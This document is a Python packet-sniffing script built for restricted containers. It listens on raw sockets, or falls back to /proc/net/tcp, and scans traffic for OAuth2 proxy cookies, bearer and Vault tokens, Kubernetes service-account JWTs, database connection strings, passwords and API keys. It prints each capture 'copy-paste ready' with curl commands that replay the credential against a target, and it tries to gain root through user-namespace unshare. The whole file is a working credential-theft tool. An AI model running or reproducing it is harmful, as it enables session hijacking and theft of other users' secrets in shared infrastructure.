#!/usr/bin/env python3
"""
sniff_raw.py — works in restricted containers
Tries multiple socket methods until one works.
"""
import socket, struct, re, os, sys, argparse, time
from datetime import datetime

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", default="any")
parser.add_argument("-p", "--port", type=int, default=None)
parser.add_argument("-o", "--output", default=None)
args = parser.parse_args()

INTERFACES  = (["lo", "eth0", "tunl0"]
               if args.interface == "any"
               else [args.interface])
FILTER_PORT = args.port
OUTFILE     = args.output or \
    f"sniff_raw_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

PORT_LABELS = {
    10443:"Jupyter-TLS", 8080:"VSCode/API",
    8081:"Jupyter",      8200:"Vault",
    8443:"oauth2-proxy", 443:"HTTPS",
    5432:"PostgreSQL",   27017:"MongoDB",
    6379:"Redis",        9090:"Prometheus",
    6443:"k8s-API",      2379:"etcd",
    53:"DNS",            9000:"MinIO",
    80:"HTTP",           8888:"Jupyter-int",
    10250:"Kubelet",
}

HIGHLIGHT_PATTERNS = {
    "OAUTH2_COOKIE":  r'_oauth2_proxy=[^\s\r\n;,]+',
    "BEARER_TOKEN":   r'(?i)authorization:\s*bearer\s+[^\s\r\n]+',
    "TOKEN_HEADER":   r'(?i)authorization:\s*token\s+[^\s\r\n]+',
    "VAULT_TOKEN":    r'(?i)x-vault-token:\s*[^\s\r\n]+',
    "VAULT_TOKEN_S":  r'\bs\.[A-Za-z0-9]{24,}\b',
    "COOKIE_HEADER":  r'(?i)^cookie:\s*.+',
    "SET_COOKIE":     r'(?i)^set-cookie:\s*.+',
    "ACCESS_TOKEN":   r'"access_token"\s*:\s*"[^"]+"',
    "REFRESH_TOKEN":  r'"refresh_token"\s*:\s*"[^"]+"',
    "SA_JWT":         r'eyJ[A-Za-z0-9\-_]{10,}\.'
                      r'[A-Za-z0-9\-_]{10,}\.'
                      r'[A-Za-z0-9\-_]{10,}',
    "S3_AUTH":        r'(?i)x-amz-[^\s\r\n:]+:\s*[^\s\r\n]+',
    "DB_CONN":        r'(?i)(?:postgresql|mongodb|redis)'
                      r'://[^\s\r\n"\'<>]+',
    "PASSWORD":       r'(?i)password["\s:=]+[^\s"&\r\n,]{4,}',
    "API_KEY":        r'(?i)(?:api[_-]?key|x-api-key)'
                      r'[\s:="]+[^\s"&\r\n]{8,}',
}

stats = {
    "total":0, "tcp":0, "udp":0,
    "logged":0, "highlights":0
}

# ── Writer ────────────────────────────────────────────────

def w(f, line, ts=True):
    if ts:
        t   = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        out = f"[{t}] {line}"
    else:
        out = line
    print(out)
    f.write(out + "\n")
    f.flush()

# ── Payload display ───────────────────────────────────────

def show_payload(f, payload):
    if not payload:
        return

    # Raw text
    w(f, "    ┌─── RAW PAYLOAD ─────────────────────────",
      ts=False)
    try:
        text = payload.decode("utf-8", errors="replace")
        for line in text.splitlines():
            w(f, f"    │ {line}", ts=False)
    except:
        for i in range(0, min(len(payload), 256), 16):
            chunk   = payload[i:i+16]
            hex_str = ' '.join(f'{b:02x}' for b in chunk)
            asc_str = ''.join(
                chr(b) if 32 <= b < 127 else '.'
                for b in chunk
            )
            w(f, f"    │ {i:04x}  {hex_str:<48}  {asc_str}",
              ts=False)
    w(f, "    └─────────────────────────────────────────",
      ts=False)

    # Extract highlights
    try:
        text = payload.decode("utf-8", errors="replace")
    except:
        return

    hits = []
    for label, pattern in HIGHLIGHT_PATTERNS.items():
        for match in re.findall(pattern, text,
                                re.MULTILINE|re.IGNORECASE):
            hits.append((label, match))
            stats["highlights"] += 1

    if not hits:
        return

    w(f, "", ts=False)
    w(f, "    ╔══ EXTRACTED (copy-paste ready) ══════════",
      ts=False)
    for label, value in hits:
        w(f, f"    ║ [{label}]", ts=False)
        w(f, f"    ║   {value}", ts=False)

        # Usage hints
        if "OAUTH2" in label:
            m = re.search(r'_oauth2_proxy=([^\s;,\r\n]+)',
                          value)
            if m:
                v = m.group(1)
                w(f, f"    ║   → curl -k "
                     f"-H 'Cookie: _oauth2_proxy={v}' "
                     f"https://TARGET:10443/PREFIX/api",
                  ts=False)
                w(f, f"    ║   → requests.get(url, "
                     f"headers={{'Cookie':"
                     f"'_oauth2_proxy={v[:30]}...'}})",
                  ts=False)

        elif "BEARER" in label or "TOKEN_HEADER" in label:
            m = re.search(r'(?i)(?:bearer|token)\s+'
                          r'([^\s\r\n]+)', value)
            if m:
                v = m.group(1)
                w(f, f"    ║   → curl -k "
                     f"-H 'Authorization: Bearer {v}' "
                     f"https://TARGET/api",
                  ts=False)

        elif "VAULT" in label:
            m = re.search(r'(?i)(?:x-vault-token:\s*|'
                          r'\bs\.)([^\s\r\n]+)', value)
            if m:
                v = m.group(0)
                w(f, f"    ║   → curl -k "
                     f"-H 'X-Vault-Token: {v}' "
                     f"$VAULT/v1/auth/token/lookup-self",
                  ts=False)

        elif "SA_JWT" in label:
            try:
                import base64, json
                parts = value.split('.')
                pad   = parts[1] + \
                        '=' * (4-len(parts[1]) % 4)
                pl    = json.loads(base64.b64decode(pad))
                ns    = pl.get('kubernetes.io',{})\
                          .get('namespace','?')
                sa    = pl.get('kubernetes.io',{})\
                          .get('serviceaccount',{})\
                          .get('name','?')
                w(f, f"    ║   → k8s SA: {ns}/{sa}",
                  ts=False)
            except:
                pass

        w(f, "    ║", ts=False)
    w(f, "    ╚═══════════════════════════════════════════",
      ts=False)

# ── Packet processing ─────────────────────────────────────

def process_ip(ip_data, iface, f):
    if len(ip_data) < 20:
        return
    iph   = struct.unpack("!BBHHHBBH4s4s", ip_data[:20])
    proto = iph[6]
    src   = socket.inet_ntoa(iph[8])
    dst   = socket.inet_ntoa(iph[9])
    ihl   = (iph[0] & 0xF) * 4
    rest  = ip_data[ihl:]

    if proto == 6 and len(rest) >= 20:      # TCP
        tcph    = struct.unpack("!HHLLBBHHH", rest[:20])
        sport   = tcph[0]
        dport   = tcph[1]
        flags   = tcph[5]
        offset  = (tcph[4] >> 4) * 4
        payload = rest[offset:]

        if FILTER_PORT and \
           sport != FILTER_PORT and \
           dport != FILTER_PORT:
            return

        fs  = "".join([
            "S" if flags & 0x02 else "",
            "A" if flags & 0x10 else "",
            "F" if flags & 0x01 else "",
            "R" if flags & 0x04 else "",
            "P" if flags & 0x08 else "",
        ]) or "."
        sl  = f"{sport}[{PORT_LABELS[sport]}]" \
              if sport in PORT_LABELS else str(sport)
        dl  = f"{dport}[{PORT_LABELS[dport]}]" \
              if dport in PORT_LABELS else str(dport)

        w(f, f"TCP {iface} "
             f"{src}:{sl} → {dst}:{dl} "
             f"flags={fs} len={len(payload)}b")

        if payload:
            show_payload(f, payload)

        stats["tcp"]    += 1
        stats["logged"] += 1

    elif proto == 17 and len(rest) >= 8:    # UDP
        sport   = struct.unpack("!H", rest[:2])[0]
        dport   = struct.unpack("!H", rest[2:4])[0]
        payload = rest[8:]

        if FILTER_PORT and \
           sport != FILTER_PORT and \
           dport != FILTER_PORT:
            return

        sl = f"{sport}[{PORT_LABELS[sport]}]" \
             if sport in PORT_LABELS else str(sport)
        dl = f"{dport}[{PORT_LABELS[dport]}]" \
             if dport in PORT_LABELS else str(dport)

        w(f, f"UDP {iface} "
             f"{src}:{sl} → {dst}:{dl} "
             f"len={len(payload)}b")
        if payload:
            show_payload(f, payload)

        stats["udp"]    += 1
        stats["logged"] += 1

    elif proto == 1 and len(rest) >= 2:     # ICMP
        w(f, f"ICMP {iface} {src} → {dst} "
             f"type={rest[0]} code={rest[1]}")
        stats["logged"] += 1

# ── Socket methods — try each until one works ─────────────

def try_af_packet(iface):
    """Method 1: AF_PACKET (needs CAP_NET_RAW)"""
    s = socket.socket(
        socket.AF_PACKET,
        socket.SOCK_RAW,
        socket.htons(0x0003)
    )
    s.bind((iface, 0))
    s.settimeout(0.05)
    return s, "AF_PACKET"

def try_raw_ip(proto=socket.IPPROTO_TCP):
    """Method 2: Raw IP socket (needs root)"""
    s = socket.socket(
        socket.AF_INET,
        socket.SOCK_RAW,
        proto
    )
    s.setsockopt(socket.IPPROTO_IP,
                 socket.IP_HDRINCL, 1)
    s.settimeout(0.05)
    return s, "RAW_IP"

def try_raw_all():
    """Method 3: Raw socket all protocols"""
    s = socket.socket(
        socket.AF_INET,
        socket.SOCK_RAW,
        socket.IPPROTO_RAW
    )
    s.settimeout(0.05)
    return s, "RAW_ALL"

def sniff_af_packet(sock, iface, f):
    """Receive loop for AF_PACKET"""
    raw, _ = sock.recvfrom(65535)
    stats["total"] += 1

    if len(raw) < 14:
        return
    eth_type = struct.unpack("!H", raw[12:14])[0]
    if eth_type == 0x0800:
        process_ip(raw[14:], iface, f)
    elif eth_type not in [0x0800, 0x86DD]:
        # No ethernet header (loopback on some systems)
        process_ip(raw, iface, f)

def sniff_raw_ip(sock, iface, f):
    """Receive loop for raw IP socket"""
    raw, addr = sock.recvfrom(65535)
    stats["total"] += 1
    process_ip(raw, iface, f)

# ── Fallback: /proc/net TCP state reader ──────────────────

def proc_net_fallback(f):
    """
    Last resort: read /proc/net/tcp for connection state.
    No packet capture, but shows all TCP connections
    and can be polled to detect new connections.
    """
    w(f, "Using /proc/net/tcp fallback "
         "(connection state only, no payload)")

    seen = set()
    while True:
        try:
            with open("/proc/net/tcp") as fh:
                lines = fh.readlines()[1:]  # skip header
            with open("/proc/net/tcp6") as fh:
                lines += fh.readlines()[1:]
        except:
            time.sleep(1)
            continue

        for line in lines:
            parts = line.split()
            if len(parts) < 4:
                continue
            local  = parts[1]
            remote = parts[2]
            state  = parts[3]

            # Decode hex address:port
            def decode_addr(hex_str):
                addr, port = hex_str.split(':')
                # IPv4 in little-endian
                ip = '.'.join(str(int(addr[i:i+2], 16))
                              for i in [6,4,2,0])
                port_n = int(port, 16)
                return ip, port_n

            try:
                local_ip,  local_port  = decode_addr(local)
                remote_ip, remote_port = decode_addr(remote)
            except:
                continue

            key = f"{local_ip}:{local_port}-" \
                  f"{remote_ip}:{remote_port}-{state}"

            if key not in seen:
                seen.add(key)
                state_names = {
                    "01":"ESTABLISHED", "02":"SYN_SENT",
                    "03":"SYN_RECV",    "04":"FIN_WAIT1",
                    "0A":"LISTEN",      "06":"TIME_WAIT",
                }
                sname = state_names.get(
                    state.upper(), state
                )
                lp = PORT_LABELS.get(local_port, local_port)
                rp = PORT_LABELS.get(remote_port, remote_port)

                if FILTER_PORT is None or \
                   local_port == FILTER_PORT or \
                   remote_port == FILTER_PORT:
                    w(f, f"CONN {local_ip}:{lp} ↔ "
                         f"{remote_ip}:{rp} [{sname}]")

        time.sleep(0.5)

# ── Main ──────────────────────────────────────────────────

def main():
    print(f"sniff_raw.py")
    print(f"  Interfaces : {INTERFACES}")
    print(f"  Port filter: {FILTER_PORT or 'ALL'}")
    print(f"  Output     : {OUTFILE}\n")

    if os.geteuid() != 0:
        print("Not root — trying unshare...")
        os.execvp("unshare", [
            "unshare", "--user", "--map-root-user",
            "--", sys.executable
        ] + sys.argv)

    with open(OUTFILE, "w", buffering=1) as f:
        w(f, f"CAPTURE START {datetime.now()}")
        w(f, f"Interface: {INTERFACES}")
        w(f, f"Port: {FILTER_PORT or 'ALL'}")
        w(f, "═" * 70)

        # ── Try socket methods in order ───────────────────
        socks   = {}   # iface → (sock, method, recv_fn)
        working = None

        # Method 1: AF_PACKET per interface
        for iface in INTERFACES:
            try:
                sock, method = try_af_packet(iface)
                socks[iface] = (sock, method, sniff_af_packet)
                w(f, f"✓ {iface}: {method}")
                working = True
            except Exception as e:
                w(f, f"✗ {iface} AF_PACKET: {e}")

        # Method 2: Single raw IP socket (all traffic)
        if not socks:
            for proto in [socket.IPPROTO_TCP,
                          socket.IPPROTO_UDP,
                          socket.IPPROTO_RAW]:
                try:
                    sock, method = try_raw_ip(proto)
                    socks["raw"] = (sock, method,
                                   sniff_raw_ip)
                    w(f, f"✓ raw socket: {method} "
                         f"proto={proto}")
                    working = True
                    break
                except Exception as e:
                    w(f, f"✗ RAW_IP proto={proto}: {e}")

        # Method 3: /proc/net fallback
        if not socks:
            w(f, "⚠ No raw sockets available!")
            w(f, "Falling back to /proc/net/tcp monitor")
            w(f, "(Shows connections but no payload)")
            try:
                proc_net_fallback(f)
            except KeyboardInterrupt:
                pass
            return

        # ── Capture loop ──────────────────────────────────
        w(f, f"\nCapturing... Ctrl+C to stop\n")
        try:
            while True:
                for iface, (sock, method, recv_fn) in \
                        socks.items():
                    try:
                        recv_fn(sock, iface, f)
                    except socket.timeout:
                        continue
                    except OSError as e:
                        # Network down error — try to reopen
                        if e.errno in [100, 101, 19]:
                            w(f, f"⚠ {iface} down, "
                                 f"skipping...")
                            time.sleep(1)
                            continue
                        raise

                if stats["total"] % 10000 == 0 \
                   and stats["total"] > 0:
                    w(f, f"[STATS] "
                         f"pkts={stats['total']} "
                         f"tcp={stats['tcp']} "
                         f"udp={stats['udp']} "
                         f"hits={stats['highlights']}")

        except KeyboardInterrupt:
            pass

        w(f, "═" * 70)
        w(f, f"CAPTURE END {datetime.now()}")
        w(f, f"pkts={stats['total']} "
             f"logged={stats['logged']} "
             f"highlights={stats['highlights']}")

    print(f"\n[*] Saved → {OUTFILE}")
    print(f"[*] Grep for extracted values:")
    print(f"    grep '║' {OUTFILE}")
    print(f"    grep 'oauth2_proxy' {OUTFILE}")
    print(f"    grep 'BEARER' {OUTFILE}")


if __name__ == "__main__":
    main()
